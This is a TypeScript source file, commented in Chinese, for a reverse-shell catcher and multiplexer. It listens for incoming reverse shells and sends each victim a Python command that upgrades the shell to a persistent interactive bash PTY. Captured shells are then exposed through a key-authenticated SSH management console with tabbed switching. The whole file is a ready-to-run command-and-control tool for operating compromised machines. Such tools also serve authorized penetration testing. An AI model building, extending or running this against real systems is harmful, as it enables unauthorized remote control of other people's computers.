import * as net from 'net';
import { timingSafeEqual } from 'crypto';
import { Server, Connection, utils, ParsedKey } from 'ssh2';
import * as fs from 'fs';
import * as path from 'path';
import { homedir } from 'os';

const PORT = 13335;
const SSH_PORT = 13336;

interface SSHConnectionState {
    stream: any;
    selectedConnection: net.Socket | null;
    commandMode: boolean;
    rows?: number;
    cols?: number;
}

// 存储所有活动的反向shell连接
const activeConnections = new Map<string, net.Socket>();
// 存储所有活动的SSH连接
const activeSSHConnections = new Map<Connection, SSHConnectionState>();

// Define render functions at top level
const visibleLength = (str: string): number => {
    return str.replace(/\x1b\[[0-9;]*m/g, '').length;
};

const renderBottomBar = (state: SSHConnectionState, stream: any) => {
    if (!state.rows || !state.cols || !stream) return;
    const status = state.selectedConnection
        ? `[Connected to: ${state.selectedConnection.remoteAddress}:${state.selectedConnection.remotePort}]`
        : '[Command Mode]';

    // Build tab string with bold for active
    let tabContent = '';
    let index = 1;
    activeConnections.forEach((socket, id) => {
        const isActive = socket === state.selectedConnection;
        tabContent += (isActive ? '\x1b[1m' : '') + ` ${index}:${id} ` + (isActive ? '\x1b[22m' : '');
        index++;
    });

    // Truncate tabs if too long
    const statusVisLength = visibleLength(status);
    const minStatusSpace = statusVisLength + 2;
    const availableForTabs = state.cols - minStatusSpace;
    let tabVisLength = visibleLength(tabContent);
    if (tabVisLength > availableForTabs) {
        // Truncate approximately; for simplicity, slice string and adjust
        tabContent = tabContent.slice(0, Math.floor(tabContent.length * (availableForTabs - 3) / tabVisLength)) + '...';
        tabVisLength = visibleLength(tabContent);
    }

    // Calculate visible padding to right-align status: total visible space between tabs and status
    const paddingVisLength = state.cols - tabVisLength - statusVisLength;
    const padding = ' '.repeat(paddingVisLength);

    // Full line: set blue bg, write tabs, padding, status, reset
    const fullLine = '\x1b[44;37m' + tabContent + padding + status + '\x1b[0m';

    // Since padding is visible spaces, and all in blue, it should fill
    stream.write('\x1b[s');
    stream.write(`\x1b[${state.rows};0H`);
    stream.write('\x1b[2K');
    stream.write(fullLine);
    stream.write('\x1b[u');
};

// 反向shell服务器
const reverseShellServer = net.createServer();

reverseShellServer.on('connection', (socket) => {
    const connectionId = `${socket.remoteAddress}:${socket.remotePort}`;
    console.log(`[+] New reverse shell connection from ${connectionId}`);
    activeConnections.set(connectionId, socket);

    // 发送创建PTY的命令，设置初始终端大小
    const ptyCommand = `python3 -c "
import pty, os;
pid = os.fork();
if pid == 0:
  os.setsid();
  pty.spawn(['/bin/bash', '-c', 'stty rows 24 cols 80; trap "" HUP; exec /bin/bash']);
else:
  os.wait()
"`;
    socket.write(ptyCommand + '\n');

    // Handle incoming data from the client
    socket.on('data', (data) => {
        // 将数据转发给所有选中的SSH连接
        activeSSHConnections.forEach((sshConn) => {
            if (sshConn.selectedConnection === socket && sshConn.stream) {
                sshConn.stream.write(data);
                if (data.toString().includes('\x1b[2J')) {
                    renderBottomBar(sshConn, sshConn.stream);
                }
            }
        });
    });

    // Handle client disconnection
    socket.on('close', () => {
        console.log(`[-] Reverse shell connection closed from ${connectionId}`);
        activeConnections.delete(connectionId);
    });

    // Handle errors
    socket.on('error', (err) => {
        console.error(`[!] Socket error: ${err.message}`);
        activeConnections.delete(connectionId);
    });
});

reverseShellServer.listen(PORT, () => {
    console.log(`[*] Reverse shell server listening on port ${PORT}`);
    console.log('[*] Waiting for reverse shell connections...');
});

// 生成SSH密钥对（如果不存在）
const keyPath = path.join(__dirname, 'ssh_keys');
if (!fs.existsSync(keyPath)) fs.mkdirSync(keyPath);

const privateKeyPath = path.join(keyPath, 'id_rsa');
const publicKeyPath = path.join(keyPath, 'id_rsa.pub');

if (!fs.existsSync(privateKeyPath)) {
    const { execSync } = require('child_process');
    execSync(`ssh-keygen -t rsa -b 4096 -f ${privateKeyPath} -N ""`);
}

const authorizedKeys = fs.readFileSync(path.join(homedir(), '.ssh', 'authorized_keys'), 'utf-8').split('\n').filter(i => i.trim());
const allowedPubKeys = authorizedKeys.map(i => utils.parseKey(i + '\n')).filter(i => i && !(i instanceof Error)) as ParsedKey[];
console.log(allowedPubKeys.length + ' keys loaded');

const eq = (a: Buffer, b: Buffer) => {
    if (a.length !== b.length) return false;
    return timingSafeEqual(a, b);
}

// SSH管理服务器
const sshServer = new Server({
    hostKeys: [fs.readFileSync(privateKeyPath)],
}, (client) => {
    const clientInfo = `SSH client`;
    console.log(`[+] New admin connection from ${clientInfo}`);

    // 初始化SSH连接状态
    const state: SSHConnectionState = { stream: null, selectedConnection: null, commandMode: false, rows: undefined, cols: undefined };
    activeSSHConnections.set(client, state);

    client.on('authentication', (ctx) => {
        if (!eq(Buffer.from(ctx.username), Buffer.from('user')))
            return ctx.reject();
        switch (ctx.method) {
            case 'password':
                return ctx.reject();
            case 'publickey':
                for (const allowedPubKey of allowedPubKeys) {
                    if (ctx.key.algo == allowedPubKey.type
                        && eq(ctx.key.data, allowedPubKey.getPublicSSH())
                        && (!ctx.signature || allowedPubKey.verify(ctx.blob!, ctx.signature, ctx.hashAlgo))) {
                        return ctx.accept();
                    }
                }
                return ctx.reject();
            default:
                return ctx.reject();
        }
    });

    client.on('ready', () => {
        client.on('session', (accept, reject) => {
            const session = accept();

            // 先处理PTY请求
            session.on('pty', (accept, reject, info) => {
                state.rows = info.rows;
                state.cols = info.cols;
                accept();
            });

            // 处理窗口大小变化
            session.on('window-change', (accept, reject, info) => {
                accept?.();
                state.rows = info.rows;
                state.cols = info.cols;
                if (state.selectedConnection) {
                    state.selectedConnection.write(`stty rows ${info.rows - 1} cols ${info.cols}\n`);
                    state.stream?.write(`\x1b[1;${info.rows - 1}r`);
                } else {
                    state.stream?.write('\x1b[r');
                }
                renderBottomBar(state, state.stream);
            });

            session.on('shell', (accept, reject) => {
                const stream = accept();
                state.stream = stream;
                if (!state.rows) {
                    state.rows = 24;
                    state.cols = 80;
                }
                console.log('[*] Admin shell session started');

                // 切换到命令模式
                const switchToCommandMode = () => {
                    if (!state.selectedConnection) return;
                    state.selectedConnection = null;
                    state.commandMode = true;
                    stream.write('\r\nCommand mode - Press number to switch tab, q to quit\r\n');
                    stream.write('\x1b[r'); // Reset scroll region to full screen
                    renderBottomBar(state, stream);
                };

                // 通过数字选择连接
                const selectConnectionByNumber = (num: number) => {
                    const connections = Array.from(activeConnections.entries());
                    if (num > 0 && num <= connections.length) {
                        const [id, socket] = connections[num - 1];
                        state.selectedConnection = socket;
                        stream.write(`\r\nSelected connection: ${id}\r\n`);
                        if (state.rows && state.cols) {
                            socket.write(`stty rows ${state.rows - 1} cols ${state.cols}\n`);
                            stream.write(`\x1b[1;${state.rows - 1}r`); // Set scroll region to protect bottom line
                        }
                        renderBottomBar(state, stream);
                    } else {
                        stream.write('\r\nInvalid connection number\r\n');
                    }
                };

                // 清屏并设置初始状态
                stream.write('\x1b[2J\x1b[H');
                stream.write('Command mode - Press number to switch tab, q to quit\r\n');
                stream.write('\x1b[r'); // Initial full scroll region for command mode
                renderBottomBar(state, stream);

                stream.on('data', (data) => {
                    const input = data.toString();
                    if (data[0] === 2) { // Ctrl+B
                        if (!state.commandMode) {
                            switchToCommandMode();
                            return;
                        } else {
                            state.commandMode = false;
                            if (state.selectedConnection && state.rows) {
                                stream.write(`\x1b[1;${state.rows - 1}r`);
                            }
                            renderBottomBar(state, stream);
                            return;
                        }
                    }
                    if (state.selectedConnection) {
                        state.selectedConnection.write(data);
                    } else {
                        const char = input[0];
                        if (char === 'q' || char === 'd') {
                            stream.end();
                        } else {
                            const num = parseInt(char);
                            if (!isNaN(num)) selectConnectionByNumber(num);
                        }
                    }
                });

                // 处理会话结束
                stream.on('close', () => {
                    state.stream = null;
                    state.selectedConnection = null;
                    console.log('[-] Admin shell session closed');
                });
            });
        });
    });

    client.on('end', () => {
        activeSSHConnections.delete(client);
        console.log(`[-] Admin connection closed from ${clientInfo}`);
    });
});

// 启动SSH服务器
sshServer.listen(SSH_PORT, '0.0.0.0', () => {
    console.log(`[*] SSH management server listening on port ${SSH_PORT}`);
    console.log('[*] Waiting for admin connections...');
    console.log(`[*] Public key for admin connection: ${fs.readFileSync(publicKeyPath, 'utf8')}`);
});
